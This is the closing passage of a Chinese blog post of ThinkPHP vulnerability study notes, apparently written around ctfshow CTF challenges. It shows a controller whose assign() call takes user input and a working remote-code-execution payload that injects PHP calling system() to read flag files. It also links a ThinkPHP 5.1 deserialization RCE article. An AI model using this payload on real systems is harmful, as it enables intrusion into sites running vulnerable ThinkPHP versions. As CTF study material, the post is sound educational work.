<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"><span class="variable">$name</span>=<span class="string">&#x27;&#x27;</span>,<span class="variable">$from</span>=<span class="string">&#x27;ctfshow&#x27;</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">assign</span>(<span class="variable">$name</span>,<span class="variable">$from</span>);<span class="comment">//标记一个变量</span></span><br><span class="line">    <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">display</span>(<span class="string">&#x27;index&#x27;</span>);<span class="comment">//显示index模板</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在<a class="link"   target="_blank" rel="noopener" href="https://www.kancloud.cn/manual/thinkphp/1794" >手册中<i class="fas fa-external-link-alt"></i></a>, 我们可以看到这样的使用方式</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202302201810553.png"
                      alt="image-20230220180923995"
                ></p>
<p>payload:</p>
<p><code>?name=_content&amp;from=&lt;?php system(&quot;cat /f*&quot;)?&gt;</code></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202302202112463.png"
                      alt="image-20230220211208344"
                ></p>
<p>直接载入php模板执行代码</p>
<h3 id="tp5-1版本"><a href="#tp5-1版本" class="headerlink" title="tp5.1版本"></a>tp5.1版本</h3><h4 id="tp5-1反序列化rce"><a href="#tp5-1反序列化rce" class="headerlink" title="tp5.1反序列化rce"></a>tp5.1反序列化rce</h4><p>推荐<a class="link"   target="_blank" rel="noopener" href="https://blog.csdn.net/shinygod/article/details/127172338" >文章<i class="fas fa-external-link-alt"></i></a></p>

            </div>

            

            
                <ul class="post-tags-box">
                    
                        <li class="tag-item">
                            <a href="/tags/Web/">#Web</a>&nbsp;
                        </li>
                    
                        <li class="tag-item">
                            <a href="/tags/Study/">#Study</a>&nbsp;
                        </li>
                    
                        <li class="tag-item">
                            <a href="/tags/SQL/">#SQL</a>&nbsp;
                        </li>
                    
                        <li class="tag-item">
                            <a href="/tags/unserialize/">#unserialize</a>&nbsp;
                        </li>
                    
                        <li class="tag-item">
                            <a href="/tags/thinkphp/">#thinkphp</a>&nbsp;
                        </li>
                    
                </ul>
            

            
                <div class="article-nav">
                    
                        <div class="article-prev">
                            <a class="prev"
                               rel="prev"
                               href="/2023/02/28/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91MISC/"
                            >
                            <span class="left arrow-icon flex-center">
                              <i class="fas fa-chevron-left"></i>
                            </span>
                                <span class="title flex-center">
                                <span class="post-nav-title-item">西湖论剑MISC</span>
                                <span class="post-nav-item">Prev posts</span>
                            </span>
                            </a>
                        </div>
                    
                    
                        <div class="article-next">
                            <a class="next"
                               rel="next"
                               href="/2023/01/24/ow/"
                            >
                            <span class="title flex-center">
                                <span class="post-nav-title-item">闲聊——纪念守望先锋国区停服</span>
                                <span class="post-nav-item">Next posts</span>
                            </span>
                                <span class="right arrow-icon flex-center">
                              <i class="fas fa-chevron-right"></i>
                            </span>
                            </a>
                        </div>
                    
                </div>
            

            
                <div class="comment-container">
                    
<div class="comments-container">
    <div id="comments-anchor"></div>
    <div class="comment-area-title">
        <i class="fas fa-comments"></i>&nbsp;Comments
    </div>
    
        
            

    <div class="waline-comment-container">
        <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/@waline/client@v2/dist/waline.css"/>
        <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/@waline/client@v2/dist/waline-meta.css"/>
        <script  src="//cdn.jsdelivr.net/npm/@waline/client@v2/dist/waline.js"></script>
        <div id="waline-comment"></div>
        <script >
          function loadWaline() {
            Waline.init({
              el: '#waline-comment',
              serverURL: 'https://waline-charmersix.vercel.app/',
              lang: 'en' || 'zh-CN',
              comment: '.post-comments-count',
              reaction: 'true' === 'true'
            })
          }

          if ('false' === 'true') {
            setTimeout(() => {
              loadWaline()
            }, 1000)
          } else {
            window.addEventListener('DOMContentLoaded', loadWaline)
          }
        </script>
    </div>



        
    
</div>

                </div>
            
        </div>

        
            <div class="toc-content-container">
                <div class="post-toc-wrap">
    <div class="post-toc">
        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AC%AC%E4%B8%80%E8%8A%82-%E8%AE%A4%E8%AF%86thinkphp"><span class="nav-number">1.</span> <span class="nav-text">第一节 认识thinkphp</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#0x1-php%E5%BC%80%E5%8F%91%E6%A1%86%E6%9E%B6"><span class="nav-number">1.1.</span> <span class="nav-text">0x1 php开发框架</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%B8%B8%E8%A7%81%E7%9A%84%E5%BC%80%E5%8F%91%E6%A1%86%E6%9E%B6"><span class="nav-number">1.1.1.</span> <span class="nav-text">常见的开发框架</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#thinkphp"><span class="nav-number">1.1.1.1.</span> <span class="nav-text">thinkphp</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#Yii"><span class="nav-number">1.1.1.2.</span> <span class="nav-text">Yii</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#Laravel"><span class="nav-number">1.1.1.3.</span> <span class="nav-text">Laravel</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#MVC%E5%9F%BA%E7%A1%80"><span class="nav-number">1.1.2.</span> <span class="nav-text">MVC基础</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#view-%E8%A7%86%E5%9B%BE"><span class="nav-number">1.1.2.1.</span> <span class="nav-text">view(视图)</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#model-%E6%A8%A1%E5%9E%8B"><span class="nav-number">1.1.2.2.</span> <span class="nav-text">model(模型)</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#controller-%E6%8E%A7%E5%88%B6%E5%99%A8"><span class="nav-number">1.1.2.3.</span> <span class="nav-text">controller(控制器)</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%87%AA%E5%B7%B1%E5%86%99%E4%B8%80%E4%B8%AAPHP%E6%A1%86%E6%9E%B6"><span class="nav-number">1.1.3.</span> <span class="nav-text">自己写一个PHP框架</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AC%AC%E4%BA%8C%E8%8A%82-thinkphp%E6%BC%8F%E6%B4%9E"><span class="nav-number">2.</span> <span class="nav-text">第二节 thinkphp漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#0x1-thinkphp%E6%A1%86%E6%9E%B6%E4%B8%8B%E7%9A%84%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-number">2.1.</span> <span class="nav-text">0x1 thinkphp框架下的信息收集</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%AF%BB%E6%89%BEtp%E6%A1%86%E6%9E%B6%E7%9A%84%E7%89%B9%E5%BE%81"><span class="nav-number">2.1.1.</span> <span class="nav-text">寻找tp框架的特征</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#url%E4%B8%AD%E5%AF%BB%E6%89%BE%E7%89%B9%E5%BE%81"><span class="nav-number">2.1.1.1.</span> <span class="nav-text">url中寻找特征</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%8A%A5%E9%94%99%E5%85%B3%E9%97%AD%E7%9A%84%E6%83%85%E5%86%B5"><span class="nav-number">2.1.1.2.</span> <span class="nav-text">报错关闭的情况</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8%E8%BD%AF%E8%B7%AF%E7%94%B1%E6%A3%80%E6%B5%8B"><span class="nav-number">2.1.1.3.</span> <span class="nav-text">使用软路由检测</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#tp%E7%9A%84%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C"><span class="nav-number">2.1.2.</span> <span class="nav-text">tp的代码执行</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#show%E5%8F%82%E6%95%B0%E5%8F%AF%E6%8E%A7%E4%B8%8B%E7%9A%84%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C"><span class="nav-number">2.1.2.1.</span> <span class="nav-text">show参数可控下的代码执行</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E6%97%A5%E5%BF%97%E6%96%87%E4%BB%B6%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C"><span class="nav-number">2.1.2.2.</span> <span class="nav-text">利用日志文件代码执行</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#tp%E7%9A%84SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E"><span class="nav-number">2.1.3.</span> <span class="nav-text">tp的SQL注入漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%9F%BA%E4%BA%8Ewhere%E7%9A%84SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E"><span class="nav-number">2.1.3.1.</span> <span class="nav-text">基于where的SQL注入漏洞</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%B3%A8%E9%87%8A%E5%BC%95%E8%B5%B7%E7%9A%84SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E"><span class="nav-number">2.1.3.2.</span> <span class="nav-text">注释引起的SQL注入漏洞</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AC%AC%E4%B8%89%E8%8A%82-thinkphp%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="nav-number">3.</span> <span class="nav-text">第三节 thinkphp反序列化</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#thinkphp%E6%8C%96%E9%93%BE%E5%AD%90"><span class="nav-number">3.0.1.</span> <span class="nav-text">thinkphp挖链子</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#tp3-2%E7%89%88%E6%9C%AC"><span class="nav-number">3.1.</span> <span class="nav-text">tp3.2版本</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#tp3-2-3%E7%89%88%E6%9C%AC%E4%B8%8B%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E"><span class="nav-number">3.1.1.</span> <span class="nav-text">tp3.2.3版本下的反序列化漏洞</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BC%AA%E9%80%A0MySQL%E6%9C%8D%E5%8A%A1%E7%AB%AF%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6"><span class="nav-number">3.1.2.</span> <span class="nav-text">伪造MySQL服务端读取文件</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#tp5-0%E7%89%88%E6%9C%AC"><span class="nav-number">3.2.</span> <span class="nav-text">tp5.0版本</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%9C%AA%E5%BC%80%E5%90%AF%E5%BC%BA%E5%88%B6%E8%B7%AF%E7%94%B1%E5%AF%BC%E8%87%B4%E7%9A%84rce"><span class="nav-number">3.2.1.</span> <span class="nav-text">未开启强制路由导致的rce</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96%E5%AF%BC%E8%87%B4%E7%9A%84rce"><span class="nav-number">3.2.2.</span> <span class="nav-text">变量覆盖导致的rce</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#tp5-1%E7%89%88%E6%9C%AC"><span class="nav-number">3.3.</span> <span class="nav-text">tp5.1版本</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#tp5-1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96rce"><span class="nav-number">3.3.1.</span> <span class="nav-text">tp5.1反序列化rce</span></a></li></ol></li></ol></li></ol>
    </div>
</div>

            </div>
        
    </div>
</div>


                
            </div>

        </div>

        <div class="page-main-content-bottom">
            
<footer class="footer">
    <div class="info-container">
        <div class="copyright-info info-item">
            &copy;
            
                <span>2022.04.28</span> -
            
            2023
            
                &nbsp;<i class="fas fa-heart icon-animate"></i>
                &nbsp;<a href="/">Charmersix</a>
            
        </div>
        
            <script async 
                    src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
            <div class="website-count info-item">
                
                    Visitor Count&nbsp;<span id="busuanzi_value_site_uv"></span>&ensp;
                
                
                    Totalview&nbsp;<span id="busuanzi_value_site_pv"></span>
                
            </div>
        
        <div class="theme-info info-item">
            Powered by <a target="_blank" href="https://hexo.io">Hexo</a>&nbsp;|&nbsp;Theme&nbsp;<a class="theme-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep v3.6.1</a>
        </div>
        
        
    </div>
</footer>

        </div>
    </div>

    
        <div class="post-tools">
            <div class="post-tools-container">
    <ul class="tools-list">
        <!-- TOC aside toggle -->
        
            <li class="tools-item flex-center toggle-show-toc">
                <i class="fas fa-list"></i>
            </li>
        

        <!-- go comment -->
        
            <li class="tools-item flex-center go-to-comments">
                <i class="fas fa-comment"></i>
                <span class="post-comments-count"></span>
            </li>
        
    </ul>
</div>

        </div>
    

    <div class="right-bottom-side-tools">
        <div class="side-tools-container">
    <ul class="side-tools-list">
        <li class="tools-item tool-font-adjust-plus flex-center">
            <i class="fas fa-search-plus"></i>
        </li>

        <li class="tools-item tool-font-adjust-minus flex-center">
            <i class="fas fa-search-minus"></i>
        </li>

        <li class="tools-item tool-dark-light-toggle flex-center">
            <i class="fas fa-moon"></i>
        </li>

        <!-- rss -->
        

        

        <li class="tools-item tool-scroll-to-bottom flex-center">
            <i class="fas fa-arrow-down"></i>
        </li>
    </ul>

    <ul class="exposed-tools-list">
        <li class="tools-item tool-toggle-show flex-center">
            <i class="fas fa-cog fa-spin"></i>
        </li>
        
            <li class="tools-item tool-scroll-to-top flex-center">
                <i class="arrow-up fas fa-arrow-up"></i>
                <span class="percent"></span>
            </li>
        
    </ul>
</div>

    </div>

    <div class="zoom-in-image-mask">
    <img class="zoom-in-image">
</div>


    
        <div class="search-pop-overlay">
    <div class="popup search-popup">
        <div class="search-header">
          <span class="search-input-field-pre">
            <i class="fas fa-keyboard"></i>
          </span>
            <div class="search-input-container">
                <input autocomplete="off"
                       autocorrect="off"
                       autocapitalize="off"
                       placeholder="Search..."
                       spellcheck="false"
                       type="search"
                       class="search-input"
                >
            </div>
            <span class="close-popup-btn">
                <i class="fas fa-times"></i>
            </span>
        </div>
        <div id="search-result">
            <div id="no-result">
                <i class="fas fa-spinner fa-pulse fa-5x fa-fw"></i>
            </div>
        </div>
    </div>
</div>

    

</main>



<script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/utils.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/main.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/header-shrink.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/back2top.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/dark-light-toggle.js"></script>




    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/local-search.js"></script>



    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/code-block.js"></script>



    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/lazyload.js"></script>


<div class="post-scripts">
    
        <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/post-helper.js"></script>
        
            <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/libs/anime.min.js"></script>
        
        
            <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/toc.js"></script>
        
    
</div>



</body>
</html>
